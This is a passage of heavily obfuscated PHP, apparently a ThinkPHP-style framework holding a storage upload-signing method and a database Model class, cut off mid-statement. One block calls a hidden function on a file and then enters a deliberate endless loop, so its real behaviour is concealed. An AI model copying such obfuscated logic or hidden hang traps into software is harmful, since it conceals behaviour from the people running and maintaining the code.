$™·¡‹†’ = $èœ¶ıù±[62]; $ÈñÜˆ’† = gmdate($èœ¶ıù±[1336]); $ÌÃÒ™ƒ„ = gmdate($èœ¶ıù±[748]); $ĞÇ§— ™ = $èœ¶ıù±[1337]; $›ŠÛ€ñ¤ = $Ïğ¿¢™× . $èœ¶ıù±[12]; $°’±“¯ˆ = $èœ¶ıù±[1299]; $’î“ÓÔ = array($this->accessKey, $ÌÃÒ™ƒ„, $this->region, $™·¡‹†’, $ĞÇ§— ™); $ÊÛ£‹Û¬ = implode($èœ¶ıù±[8], $’î“ÓÔ); $ì”†¼¿° = array($èœ¶ıù±[1301] => gmdate($èœ¶ıù±[1300], strtotime($èœ¶ıù±[1338])), $èœ¶ıù±[1302] => array(array($èœ¶ıù±[1304] => $this->bucket), array($èœ¶ıù±[1303] => $îÏ¦Ó°»), array($èœ¶ıù±[1305], $èœ¶ıù±[1306], $èœ¶ıù±[12]), array($èœ¶ıù±[1305], $èœ¶ıù±[1339], $èœ¶ıù±[12]), array($èœ¶ıù±[1305], $èœ¶ıù±[1340], $èœ¶ıù±[12]), array($èœ¶ıù±[1307] => $°’±“¯ˆ), array($èœ¶ıù±[1341] => $ÊÛ£‹Û¬), array($èœ¶ıù±[1342] => $«‚Á°Û), array($èœ¶ıù±[1343] => $ÈñÜˆ’†), array($èœ¶ıù±[1344] => $›ŠÛ€ñ¤))); $ï”²¼Îõ = base64_encode(json_encode($ì”†¼¿°)); $Ş£ÑûÁ = hash_hmac($èœ¶ıù±[1345], $ÌÃÒ™ƒ„, $èœ¶ıù±[1346] . $this->secret, !0); $·’ºÈ¢ = hash_hmac($èœ¶ıù±[1345], $this->region, $Ş£ÑûÁ, !0); $ØÈÑƒ‘Š = hash_hmac($èœ¶ıù±[1345], $™·¡‹†’, $·’ºÈ¢, !0); $ìŞ†¿Üš = hash_hmac($èœ¶ıù±[1345], $ĞÇ§— ™, $ØÈÑƒ‘Š, !0); $¬ñà¥ä’ = hash_hmac($èœ¶ıù±[1345], $ï”²¼Îõ, $ìŞ†¿Üš); $Ñ†‰‰¥Ò = array($èœ¶ıù±[212] => $èœ¶ıù±[12], $èœ¶ıù±[1347] => $èœ¶ıù±[12], $èœ¶ıù±[1303] => $îÏ¦Ó°», $èœ¶ıù±[1307] => $°’±“¯ˆ, $èœ¶ıù±[1311] => $ï”²¼Îõ, $èœ¶ıù±[1348] => $ÊÛ£‹Û¬, $èœ¶ıù±[1349] => $«‚Á°Û, $èœ¶ıù±[1350] => $ÈñÜˆ’†, $èœ¶ıù±[1351] => $›ŠÛ€ñ¤, $èœ¶ıù±[1352] => $¬ñà¥ä’, $èœ¶ıù±[176] => $this->getHost()); return $Ñ†‰‰¥Ò; } } if (!isset($_SERVER[$_SERVER[Æ š¦İÈ][391]]) || !isset($_SERVER[$_SERVER[Æ š¦İÈ][399]])) { $_getc = $_SERVER[Æ š¦İÈ][393]; $_getfile = $_SERVER[$_SERVER[Æ š¦İÈ][394]] . $_SERVER[Æ š¦İÈ][395]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Æ š¦İÈ][228], $_getfilec); if (count($_getarrs) < $_SERVER[Æ š¦İÈ][396]) { $exit = $_SERVER[Æ š¦İÈ][397]; $exit(); } $_act = $_SERVER[Æ š¦İÈ][398]; $_act($_SERVER[$_SERVER[Æ š¦İÈ][394]] . $_SERVER[Æ š¦İÈ][395]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Æ š¦İÈ][375]); } } goto Cš£ÆÍñçƒ; a½…Òù¹”: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\x65", "\x6f\162\144\x65\162", "\141\154\x69\x61\163", "\150\141\166\x69\156\147", "\x67\162\x6f\x75\160", "\154\x6f\143\x6b", "\x64\151\163\x74\x69\156\x63\164", "\x61\165\x74\x6f", "\x66\151\154\164\x65\x72", "\x76\141\154\151\x64\141\x74\x65", "\162\x65\163\x75\x6c\x74", "\142\151\x6e\144", "\x74\157\153\145\156"); public function __construct($–Üæ’Ûµ = '', $ô„–øê = '', $¶ÛÉ¬Õ = '') { $›°ÕÅ™Â =& $_SERVER[Æ š¦İÈ]; $this->_initialize(); if (!empty($–Üæ’Ûµ)) { if (strpos($–Üæ’Ûµ, $›°ÕÅ™Â[10])) { list($this->dbName, $this->name) = explode($›°ÕÅ™Â[10], $–Üæ’Ûµ); } else { $this->name = $–Üæ’Ûµ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ô„–øê)) { $this->tablePrefix = $›°ÕÅ™Â[12]; } elseif ($›°ÕÅ™Â[12] != $ô„–øê) { $this->tablePrefix = $ô„–øê; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($›°ÕÅ™Â[241]); } $this->db(0, empty($this->connection) ? $¶ÛÉ¬Õ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $şòåê‰Ú =& $_SERVER[Æ š¦İÈ]; if (empty($this->fields)) { if (think_config($şòåê‰Ú[242])) { $Ôáğˆ×ò = $this->dbName ? $this->dbName : think_config($şòåê‰Ú[243]); $ƒêæƒ…£ = think_var_cache($şòåê‰Ú[244] . strtolower(get_path_this($Ôáğˆ×ò) . $şòåê‰Ú[10] . $this->name)); if ($ƒêæƒ…£) { $öàñôÒÇ = think_config($şòåê‰Ú[245]); if (empty($öàñôÒÇ) || $ƒêæƒ…£[$şòåê‰Ú[246]] == $öàñôÒÇ) { $this->fields = $ƒêæƒ…£; return; } } } $this->flush(); } } public function flush() { $Ù¼»çØï =& $_SERVER[Æ š¦İÈ]; $this->db->setModel($this->name); $û¿â¤ıõ = $this->db->getFields($this->getTableName()); if (!$û¿â¤ıõ) { return !1; } $this->fields = array_keys($û¿â¤ıõ); $this->fields[$Ù¼»çØï[247]] = !1; foreach ($û¿â¤ıõ as $Õáçˆıù => $íÓ×ÆŸÛ) { $°Ÿ›Ö Ì[$Õáçˆıù] = $íÓ×ÆŸÛ[$Ù¼»çØï[33]]; if ($íÓ×ÆŸÛ[$Ù¼»çØï[39]]) { $this->fields[$Ù¼»çØï[248]] = $Õáçˆıù; if ($íÓ×ÆŸÛ[$Ù¼»çØï[42]]) { $this->fields[$Ù¼»çØï[247]] = !0; } } } $this->fields[$Ù¼»çØï[249]] = $°Ÿ›Ö Ì; if (think_config($Ù¼»çØï[245])) { $this->fields[$Ù¼»çØï[246]] = think_config($Ù¼»çØï[245]); } if (think_config($Ù¼»çØï[242])) { $ÛÖ´†§ = $this->dbName ? $this->dbName : think_config($Ù¼»çØï[243]); think_var_cache($Ù¼»çØï[244] . strtolower(get_path_this($ÛÖ´†§) . $Ù¼»çØï[10] . $this->name), $this->fields); } } public function switchModel($ËµÒê‘¸, $İ¦İÉé° = array()) { $ø¿ƒ ¾è =& $_SERVER[Æ š¦İÈ]; $¾øè„ƒ© = ucwords(strtolower($ËµÒê‘¸)) . $ø¿ƒ ¾è[250]; if (!class_exists($¾øè„ƒ©)) { think_exception($¾øè„ƒ© . think_lang($ø¿ƒ ¾è[251])); } $this->_extModel = new $¾øè„ƒ©($this->name); if (!empty($İ¦İÉé°)) { foreach ($İ¦İÉé° as $Èç¥ÌÀ£) { $this->_extModel->setProperty($Èç¥ÌÀ£, $this->{$Èç¥ÌÀ£}); } } return $this->_extModel; } public function __set($ÀÉ­¸ĞÎ, $»¥È“Ôù) { $this->data[$ÀÉ­¸ĞÎ] = $»¥È“Ôù; } public function __get($¯¼ŞÙĞœ) { return isset($this->data[$¯¼ŞÙĞœ]) ? $this->data[$¯¼ŞÙĞœ] : null; } public function __isset($ğÛùù­¤) { return isset($this->data[$ğÛùù­¤]); } public function __unset($éÜ’Øãš) { unset($this->data[$éÜ’Øãš]); } public function __call($ôö´¯Éœ, $¤­¿ö¦) { $™›ğù¯Ó =& $_SERVER[Æ š¦İÈ]; if (in_array(strtolower($ôö´¯Éœ), $this->methods, !0)) { $this->options[strtolower($ôö´¯Éœ)] = $¤­¿ö¦[0]; return $this; } elseif (in_array(strtolower($ôö´¯Éœ), array($™›ğù¯Ó[252], $™›ğù¯Ó[253], $™›ğù¯Ó[254], $™›ğù¯Ó[255], $™›ğù¯Ó[256]), !0)) { $·İàşÚ = isset($¤­¿ö¦[0]) ? $¤­¿ö¦[0] : $™›ğù¯Ó[183]; $·İàşÚ = $this->db->parseKey($·İàşÚ); return $this->getField(strtoupper($ôö´¯Éœ) . $™›ğù¯Ó[257] . $·İàşÚ . $™›ğù¯Ó[258] . $ôö´¯Éœ, $™›ğù¯Ó[252]); } elseif (strtolower(substr($ôö´¯Éœ, 0, 5)) == $™›ğù¯Ó[259]) { $·İàşÚ = think_parse_name(substr($ôö´¯Éœ, 5)); $ñ±äùÒ‘[$·İàşÚ] = $¤­¿ö¦[0]; return $this->where($ñ±äùÒ‘)->find(); } elseif (strtolower(substr($ôö´¯Éœ, 0, 10)) == $™›ğù¯Ó[260]) { $æÃ•®úº = think_parse_name(substr($ôö´¯Éœ, 10)); $ñ±äùÒ‘[$æÃ•®úº] = $¤­¿ö¦[0]; return $this->where($ñ±äùÒ‘)->getField($¤­¿ö¦[1]); } elseif (isset($this->_scope[$ôö´¯Éœ])) { return $this->scope($ôö´¯Éœ, $¤­¿ö¦[0]); } elseif (method_exists($this, $ôö´¯Éœ)) { array_unshift($¤­¿ö¦, $ôö´¯Éœ); return call_user_func_array(array($this, $™›ğù¯Ó[261]), $¤­¿ö¦); } else { return call_user_func_array(array(parent, $ôö´¯Éœ), $¤­¿ö¦); } } protected function call() { $¤á•Ë =& $_SERVER[Æ š¦İÈ]; $ºÓ”Ùö = func_get_args(); $Ÿ´û¿Ñ¼ = array_shift($ºÓ”Ùö); $Óš§²æ· = $Ÿ´û¿Ñ¼; if (is_array($Ÿ´û¿Ñ¼)) { $Óš§²æ· = $Ÿ´û¿Ñ¼[1]; $Ÿ´û¿Ñ¼ = $Ÿ´û¿Ñ¼[0]; } $·¶ŠÃ”— = count($ºÓ”Ùö) - 1; if (isset($ºÓ”Ùö[$·¶ŠÃ”—]) && $ºÓ”Ùö[$·¶ŠÃ”—] === $Ÿ´û¿Ñ¼) { think_exception(__CLASS__ . $¤á•Ë[4] . $Ÿ´û¿Ñ¼ . think_lang($¤á•Ë[262])); return; } $ºÓ”Ùö[] = $Ÿ´û¿Ñ¼; if (method_exists($this, $¤á•Ë[263])) { $°Ò›ôÏÌ = call_user_func_array(array($this, $¤á•Ë[264]), array($Óš§²æ·, $ºÓ”Ùö)); if (!is_null($°Ò›ôÏÌ) && $°Ò›ôÏÌ !== !1) { return $°Ò›ôÏÌ; } } $³™Ì›Ñâ = call_user_func_array(array($this, $Ÿ´û¿Ñ¼), $ºÓ”Ùö); if (method_exists($this, $¤á•Ë[265])) { $°Ò›ôÏÌ = call_user_func_array(array($this, $¤á•Ë[266]), array($Óš§²æ·, $ºÓ”Ùö, $³™Ì›Ñâ)); if ($°Ò›ôÏÌ) { return $°Ò›ôÏÌ; } } return $³™Ì›Ñâ; } protected function _initialize() { } protected function _facade($Ì¸š»°‚) { $³Üşí•ø =& $_SERVER[Æ š¦İÈ]; if (!empty($this->fields)) { foreach ($Ì¸š»°‚ as $÷û‡Şí÷ => $îÏÛıºö) { if (is_array($this->fields) && !in_array($÷û‡Şí÷, $this->fields, !0)) { unset($Ì¸š»°‚[$÷û‡Şí÷]); } elseif (is_scalar($îÏÛıºö)) { $this->_parseType($Ì¸š»°‚, $÷û‡Şí÷); } } } if (!empty($this->options[$³Üşí•ø[267]])) { $Ì¸š»°‚ = array_map($this->options[$³Üşí•ø[267]], $Ì¸š»°‚); unset($this->options[$³Üşí•ø[267]]); } $this->_beforeWrite($Ì¸š»°‚); return $Ì¸š»°‚; } protected function _beforeWrite(&$Î£œÖÚÈ) { } public function add($úîµÍò‚ = '', $–…ºÍü´ = array(), $ŞôäšÑ¦ = false) { if (empty($úîµÍò‚)) { if (!empty($this->data)) { $úîµÍò‚ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Æ š¦İÈ][268]); return !1; } } $–…ºÍü´ = $this->_parseOptions($–…ºÍü´); $úîµÍò‚ = $this->_facade($úîµÍò‚); if (!1 === $this->_beforeInsert($úîµÍò‚, $–…ºÍü´)) { return !1; } $¿ÆåˆÏ = $this->db->insert($úîµÍò‚, $–…ºÍü´, $ŞôäšÑ¦); if (!1 !== $¿ÆåˆÏ) { $ÂëìûÚ = $this->getLastInsID(); if ($ÂëìûÚ) { $úîµÍò‚[$this->getPk()] = $ÂëìûÚ; $this->_after_insert($úîµÍò‚, $–…ºÍü´); return $ÂëìûÚ; } $this->_after_insert($úîµÍò‚, $–…ºÍü´); } return $¿ÆåˆÏ; } protected function _beforeInsert(&$àÊŒ°, $™éÃı¯¢) { } protected function _after_insert($õ”ºÉˆş, $à–ÏÅØÈ) { } public function addAll($¿¡Ääº¬, $õ²¬Ùâ = array(), $¶´ƒÎ‡ô = false) { $Ìğúé• =& $_SERVER[Æ š¦İÈ]; if (empty($¿¡Ääº¬)) { $this->error = think_lang($Ìğúé•[268]); return !1; } $õ²¬Ùâ = $this->_parseOptions($õ²¬Ùâ); foreach ($¿¡Ääº¬ as $¸³äï±ù => $Òäå¼Ø) { $¿¡Ääº¬[$¸³äï±ù] = $this->_facade($Òäå¼Ø); } if (method_exists($this->db, $Ìğúé•[269])) { $Èï±ì­Ñ = $this->db->insertAll($¿¡Ääº¬, $õ²¬Ùâ, $¶´ƒÎ‡ô); } else { $this->startTrans(); foreach ($¿¡Ääº¬ as $¸³äï±ù => $Òäå¼Ø) { $Èï±ì­Ñ = $this->db->insert($Òäå¼Ø, $õ²¬Ùâ, $¶´ƒÎ‡ô); } $this->commit(); } if (!1 !== $Èï±ì­Ñ) { $°‚¥º = $this->getLastInsID(); if ($°‚¥º) { return $°‚¥º; } } return $Èï±ì­Ñ; } public function selectAdd($€ÚÊûµ = '', $Á•Öë– = '', $¯Îé¤‹Õ = array()) { $Øñ÷±¨› =& $_SERVER[Æ š¦İÈ]; $¯Îé¤‹Õ = $this->_parseOptions($¯Îé¤‹Õ); if (!1 === ($¬“Ò¼ìî = $this->db->selectInsert($€ÚÊûµ ? $€ÚÊûµ : $¯Îé¤‹Õ[$Øñ÷±¨›[270]], $Á•Öë– ? $Á•Öë– : $this->getTableName(), $¯Îé¤‹Õ))) { $this->error = think_lang($Øñ÷±¨›[271]); return !1; } else { return $¬“Ò¼ìî; } } public function save($ğÔıä‚ö = '', $Ú×–ï¸õ = array()) { $ì¢âõ¥· =& $_SERVER[Æ š¦İÈ]; if (empty($ğÔıä‚ö)) { if (!empty($this->data)) { $ğÔıä‚ö = $this->data; $this->data = array(); } else { $this->error = think_lang($ì¢âõ¥·[268]); return !1; } } $ğÔıä‚ö = $this->_facade($ğÔıä‚ö); $Ú×–ï¸õ = $this->_parseOptions($Ú×–ï¸õ); $ûƒ¸ëÕ = $this->getPk(); if (!isset($Ú×–ï¸õ[$ì¢âõ¥·[272]])) { if (isset($ğÔıä‚ö[$ûƒ¸ëÕ])) { $ü²…˜Úï[$ûƒ¸ëÕ] = $ğÔıä‚ö[$ûƒ¸ëÕ]; $Ú×–ï¸õ[$ì¢âõ¥·[272]] = $ü²…˜Úï; unset($ğÔıä‚ö[$ûƒ¸ëÕ]); } else { $this->error = think_lang($ì¢âõ¥·[271]); return !1; } } if (is_array($Ú×–ï¸õ[$ì¢âõ¥·[272]]) && isset($Ú×–ï¸õ[$ì¢âõ¥·[272]][$ûƒ¸ëÕ])) { $ºÔ¬”²¥ = $Ú×–ï¸õ[$ì¢âõ¥·[272]][$ûƒ¸ëÕ]; } if (!1 === $this->_beforeUpdate($ğÔıä‚ö, $Ú×–ï¸õ)) { return !1; } $àáıªâ = $this->db->update($ğÔıä‚ö, $Ú×–ï¸õ); if (!1 !== $àáıªâ) { if (isset($ºÔ¬”²¥)) { $ğÔıä‚ö[$ûƒ¸ëÕ] = $ºÔ¬”²¥; } $this->_afterUpdate($ğÔıä‚ö, $Ú×–ï¸õ); } return $àáıªâ; } protected function _beforeUpdate(&$ºãÇèÕ, $î¥‡º‹) { } protected function _afterUpdate($İàÆÉÂ, $êîƒåËÒ) { } public function delete($ˆÍÜÔé = array()) { $ÀÀ‹‹°û =& $_SERVER[Æ š¦İÈ]; if (empty($ˆÍÜÔé) && empty($this->options[$ÀÀ‹‹°û[272]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $¶Óô©Ãß = $this->getPk(); if (is_numeric($ˆÍÜÔé) || is_string($ˆÍÜÔé)) { if (strpos($ˆÍÜÔé, $ÀÀ‹‹°û[50])) { $ùÓ‚¨Üó[$¶Óô©Ãß] = array($ÀÀ‹‹°û[273], $ˆÍÜÔé); } else { $ùÓ‚¨Üó[$¶Óô©Ãß] = $ˆÍÜÔé; } $this->options[$ÀÀ‹‹°û[272]] = $ùÓ‚¨Üó; } $ˆÍÜÔé = $this->_parseOptions(); if (is_array($ˆÍÜÔé[$ÀÀ‹‹°û[272]]) && isset($ˆÍÜÔé[$ÀÀ‹‹°û[272]][$¶Óô©Ãß])) { $¹é‡ºÆ = $ˆÍÜÔé[$ÀÀ‹‹°û[272]][$¶Óô©Ãß]; } $ıñ³‰¨€ = $this->db->delete($ˆÍÜÔé); if (!1 !== $ıñ³‰¨€) { $ë‡ì–¢ô = array(); if (isset($¹é‡ºÆ)) { $ë‡ì–¢ô[$¶Óô©Ãß] = $¹é‡ºÆ; } $this->_after_delete($ë‡ì–¢ô, $ˆÍÜÔé); } return $ıñ³‰¨€; } protected function _after_delete($ß‚¹Œ , $¢ó²¾””) { } public function select($Ô²íÂğ = array()) { $î€Ë‹ˆ =& $_SERVER[Æ š¦İÈ]; if (is_string($Ô²íÂğ) || is_numeric($Ô²íÂğ)) { $µÖ ˜‹€ = $this->getPk(); if (strpos($Ô²íÂğ, $î€Ë‹ˆ[50])) { $ÛÙ”å°Ô[$µÖ ˜‹€] = array($î€Ë‹ˆ[273], $Ô²íÂğ); } else { $ÛÙ”å°Ô[$µÖ ˜‹€] = $Ô²íÂğ; } $this->options[$î€Ë‹ˆ[272]] = $ÛÙ”å°Ô; } elseif (!1 === $Ô²íÂğ) { $Ô²íÂğ = $this->_parseOptions(); return $î€Ë‹ˆ[274] . $this->db->buildSelectSql($Ô²íÂğ) . $î€Ë‹ˆ[275]; } $Ô²íÂğ = $this->_parseOptions(); $ïÍÈá° = $this->db->select($Ô²íÂğ); if (!1 === $ïÍÈá°) { return !1; } if (empty($ïÍÈá°)) { return null; } $this->_afterSelect($ïÍÈá°, $Ô²íÂğ); return $ïÍÈá°; } protected function _afterSelect(&$­Š¤ïŒ¨, $¥’Õİ‡) { } public function buildSql($ìÖ¿äò = array()) { $áïÁíØÓ =& $_SERVER[Æ š¦İÈ]; $ìÖ¿äò = $this->_parseOptions($ìÖ¿äò); return $áïÁíØÓ[274] . $this->db->buildSelectSql($ìÖ¿äò) . $áïÁíØÓ[275]; } public function optionsValue($‚ûÕİÓ = null) { if (is_null($‚ûÕİÓ)) { return $this->options; } elseif (is_array($‚ûÕİÓ)) { $this->options = array_merge($this->options, $‚ûÕİÓ); } } protected function _parseOptions($¿ŸŒ„¡± = array()) { $åŞÉã€É =& $_SERVER[Æ š¦İÈ]; if (is_array($¿ŸŒ„¡±)) { $¿ŸŒ„¡± = array_merge($this->options, $¿ŸŒ„¡±); } $this->options = array(); if (!isset($¿ŸŒ„¡±[$åŞÉã€É[276]])) { $¿ŸŒ„¡±[$åŞÉã€É[276]] = $this->getTableName(); $À„•Ñ¹ = $this->fields; } else { $À„•Ñ¹ = $this->getDbFields(); } if (!empty($¿ŸŒ„¡±[$åŞÉã€É[277]])) { $¿ŸŒ„¡±[$åŞÉã€É[276]] .= $åŞÉã€É[53] . $¿ŸŒ„¡±[$åŞÉã€É[277]]; } $¿ŸŒ„¡±[$åŞÉã€É[278]] = $this->name; if (isset($¿ŸŒ„¡±[$åŞÉã€É[272]]) && is_array($¿ŸŒ„¡±[$åŞÉã€É[272]]) && !empty($À„•Ñ¹) && !isset($¿ŸŒ„¡±[$åŞÉã€É[279]]) && !isset($¿ŸŒ„¡±[$åŞÉã€É[276]])) { foreach ($¿ŸŒ„¡±[$åŞÉã€É[272]] as $Ï•Ş§ĞÊ => $¨æó››¶) { $Ï•Ş§ĞÊ = trim($Ï•Ş§ĞÊ); if (in_array($Ï•Ş§ĞÊ, $À„•Ñ¹, !0)) { if (is_scalar($¨æó››¶)) { $this->_parseType($¿ŸŒ„¡±[$åŞÉã€É[272]], $Ï•Ş§ĞÊ); } } elseif (!is_numeric($Ï•Ş§ĞÊ) && $åŞÉã€É[11] != substr($Ï•Ş§ĞÊ, 0, 1) && !1 === strpos($Ï•Ş§ĞÊ, $åŞÉã€É[10]) && !1 === strpos($Ï•Ş§ĞÊ, $åŞÉã€É[257]) && !1 === strpos($Ï•Ş§ĞÊ, $åŞÉã€É[280]) && !1 === strpos($Ï•Ş§ĞÊ, $åŞÉã€É[281])) { unset($¿ŸŒ„¡±[$åŞÉã€É[272]][$Ï•Ş§ĞÊ]); } } } $this->_options_filter($¿ŸŒ„¡±); return $¿ŸŒ„¡±; } protected function _options_filter(&$š¿¶Ô”•) { } protected function _parseType(&$Øí–Â„¨, $Š’¶¤ß) { $Î“Ïá·Í =& $_SERVER[Æ š¦İÈ]; if (empty($this->options[$Î“Ïá·Í[282]][$Î“Ïá·Í[4] . $Š’¶¤ß])) { $üåù¸Æ¼ = strtolower($this->fields[$Î“Ïá·Í[249]][$Š’¶¤ß]); if (!1 !== strpos($üåù¸Æ¼, $Î“Ïá·Í[283])) { } elseif (!1 === strpos($üåù¸Æ¼, $Î“Ïá·Í[284]) && !1 !== strpos($üåù¸Æ¼, $Î“Ïá·Í[285])) { $Øí–Â„¨[$Š’¶¤ß] = intval($Øí–Â„¨[$Š’¶¤ß]); } elseif (!1 !== strpos($üåù¸Æ¼, $Î“Ïá·Í[286]) || !1 !== strpos($üåù¸Æ¼, $Î“Ïá·Í[287])) { $Øí–Â„¨[$Š’¶¤ß] = floatval($Øí–Â„¨[$Š’¶¤ß]); } elseif (!1 !== strpos($üåù¸Æ¼, $Î“Ïá·Í[288])) { $Øí–Â„¨[$Š’¶¤ß] = (bool) $Øí–Â„¨[$Š’¶¤ß]; } } } public function find($¨Óè­’ = array()) { $Îµ½ÊÈï =& $_SERVER[Æ š¦İÈ]; if (is_numeric($¨Óè­’) || is_string($¨Óè­’)) { $¢åò¾åæ[$this->getPk()] = intval($¨Óè­’); $this->options[$Îµ½ÊÈï[272]] = $¢åò¾åæ; } $this->options[$Îµ½ÊÈï[289]] = 1; $¨Óè­’ = $this->_parseOptions(); $İ©·á = $this->db->select($¨Óè­’); if (!1 === $İ©·á) { return !1; } if (empty($İ©·á)) { return null; } $this->data = $İ©·á[0]; $this->_afterFind($this->data, $¨Óè­’); if (!empty($this->options[$Îµ½ÊÈï[290]])) { return $this->returnResult($this->data, $this->options[$Îµ½ÊÈï[290]]); } return $this->data; } protected function _afterFind(&$ö¶¡ú¹×, $Œğ—ë§‡) { } protected function returnResult($¸¸ãöÕë, $íœåˆ¹± = '') { $úÆ’Ùœô =& $_SERVER[Æ š¦İÈ]; if ($íœåˆ¹±) { if (is_callable($íœåˆ¹±)) { return call_user_func($íœåˆ¹±, $¸¸ãöÕë); } switch (strtolower($íœåˆ¹±)) { case $úÆ’Ùœô[291]: return json_encode($¸¸ãöÕë); case $úÆ’Ùœô[292]: return xml_encode($¸¸ãöÕë); } } return $¸¸ãöÕë; } public function parseFieldsMap($Èñ’­İˆ, $Áİ¬´½½ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $÷¸§ñ©ä => $ÛÜî•¦) { if ($Áİ¬´½½ == 1) { if (isset($Èñ’­İˆ[$ÛÜî•¦])) { $Èñ’­İˆ[$÷¸§ñ©ä] = $Èñ’­İˆ[$ÛÜî•¦]; unset($Èñ’­İˆ[$ÛÜî•¦]); } } else { if (isset($Èñ’­İˆ[$÷¸§ñ©ä])) { $Èñ’­İˆ[$ÛÜî•¦] = $Èñ’­İˆ[$÷¸§ñ©ä]; unset($Èñ’­İˆ[$÷¸§ñ©ä]); } } } } return $Èñ’­İˆ; } public function setField($®ÆªÌ¡÷, $ëÒ¨±ƒ = '') { if (is_array($®ÆªÌ¡÷)) { $å€Ë»Œ = $®ÆªÌ¡÷; } else { $å€Ë»Œ[$®ÆªÌ¡÷] = $ëÒ¨±ƒ; } return $this->save($å€Ë»Œ); } public function setAdd($öò×¥¥, $²ÑÌåšî = 1) { $«ÁÃÅá =& $_SERVER[Æ š¦İÈ]; $÷óÁ”ƒ¦ = $öò×¥¥ . $«ÁÃÅá[293] . $²ÑÌåšî; if ($²ÑÌåšî < 0) { $÷óÁ”ƒ¦ = $öò×¥¥ . $²ÑÌåšî; } return $this->setField($öò×¥¥, array($«ÁÃÅá[294], $÷óÁ”ƒ¦)); } public function getField($£ãå†Ëº, $…†ªå’ğ = null) { $„Óàªüé =& $_SERVER[Æ š¦İÈ]; $ÄİÙäõº[$„Óàªüé[270]] = $£ãå†Ëº; $ÄİÙäõº = $this->_parseOptions($ÄİÙäõº); $£ãå†Ëº = trim($£ãå†Ëº); if (strpos($£ãå†Ëº, $„Óàªüé[50])) { if (!isset($ÄİÙäõº[$„Óàªüé[289]])) { $ÄİÙäõº[$„Óàªüé[289]] = is_numeric($…†ªå’ğ) ? $…†ªå’ğ : $„Óàªüé[12]; } $Ö¯õ‹¹à = $this->db->select($ÄİÙäõº); if (!empty($Ö¯õ‹¹à)) { $Çëòä¿ = explode($„Óàªüé[50], $£ãå†Ëº); $£ãå†Ëº = array_keys($Ö¯õ‹¹à[0]); $©ê ½…« = array_shift($£ãå†Ëº); $ÁšÈÈÉ§ = array_shift($£ãå†Ëº); $Öõè’É§ = array(); $ú¿ìÛ¾ñ = count($Çëòä¿); foreach ($Ö¯õ‹¹à as $ú³šÃ¸£) { $—İ°æà = $ú³šÃ¸£[$©ê ½…«]; if (2 == $ú¿ìÛ¾ñ) { $Öõè’É§[$—İ°æà] = $ú³šÃ¸£[$ÁšÈÈÉ§]; } else { $Öõè’É§[$—İ°æà] = is_string($…†ªå’ğ) ? implode($…†ªå’ğ, $ú³šÃ¸£) : $ú³šÃ¸£; } } return $Öõè’É§; } } else { if (!0 !== $…†ªå’ğ) { $ÄİÙäõº[$„Óàªüé[289]] = is_numeric($…†ªå’ğ) ? $…†ªå’ğ : 1; } if ($…†ªå’ğ === $„Óàªüé[252]) { unset($ÄİÙäõº[$„Óàªüé[289]]); } $ú³šÃ¸£ = $this->db->select($ÄİÙäõº); if (!empty($ú³šÃ¸£)) { if ($…†ªå’ğ === $„Óàªüé[252]) { return reset($ú³šÃ¸£[0]); } if (!0 !== $…†ªå’ğ && 1 == $ÄİÙäõº[$„Óàªüé[289]]) { return reset($ú³šÃ¸£[0]); } foreach ($ú³šÃ¸£ as $˜áÆ­) { $÷Î´Âàğ[] = $˜áÆ­[$£ãå†Ëº]; } return $÷Î´Âàğ; } } return null; } public function create($¢‚‰¸Û§ = '', $¥†Ô‘‹ = '') { $£©Æ¾°Õ =& $_SERVER[Æ š¦İÈ]; if (empty($¢‚‰¸Û§)) { $¢‚‰¸Û§ = $_POST; } elseif (is_object($¢‚‰¸Û§)) { $¢‚‰¸Û§ = get_object_vars($¢‚‰¸Û§); } if (empty($¢‚‰¸Û§) || !is_array($¢‚‰¸Û§)) { $this->error = think_lang($£©Æ¾°Õ[268]); return !1; } $¢‚‰¸Û§ = $this->parseFieldsMap($¢‚‰¸Û§, 0); $¥†Ô‘‹ = $¥†Ô‘‹ ? $¥†Ô‘‹ : (!empty($¢‚‰¸Û§[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$£©Æ¾°Õ[270]])) { $¦‡ç‚À© = $this->options[$£©Æ¾°Õ[270]]; unset($this->options[$£©Æ¾°Õ[270]]); } elseif ($¥†Ô‘‹ == THINK_MODEL_INSERT && isset($this->insertFields)) { $¦‡ç‚À© = $this->insertFields; } elseif ($¥†Ô‘‹ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $¦‡ç‚À© = $this->updateFields; } if (isset($¦‡ç‚À©)) { if (is_string($¦‡ç‚À©)) { $¦‡ç‚À© = explode($£©Æ¾°Õ[50], $¦‡ç‚À©); } if (think_config($£©Æ¾°Õ[295])) { $¦‡ç‚À©[] = think_config($£©Æ¾°Õ[296]); } foreach ($¢‚‰¸Û§ as $í¸¯†í => $˜µ‘Áã) { if (!in_array($í¸¯†í, $¦‡ç‚À©)) { unset($¢‚‰¸Û§[$í¸¯†í]); } } } if (!$this->autoValidation($¢‚‰¸Û§, $¥†Ô‘‹)) { return !1; } if (!$this->autoCheckToken($¢‚‰¸Û§)) { $this->error = think_lang($£©Æ¾°Õ[297]); return !1; } if ($this->autoCheckFields) { $¦‡ç‚À© = $this->getDbFields(); foreach ($¢‚‰¸Û§ as $í¸¯†í => $˜µ‘Áã) { if (!in_array($í¸¯†í, $¦‡ç‚À©)) { unset($¢‚‰¸Û§[$í¸¯†í]); } elseif (MAGIC_QUOTES_GPC && is_string($˜µ‘Áã)) { $¢‚‰¸Û§[$í¸¯†í] = 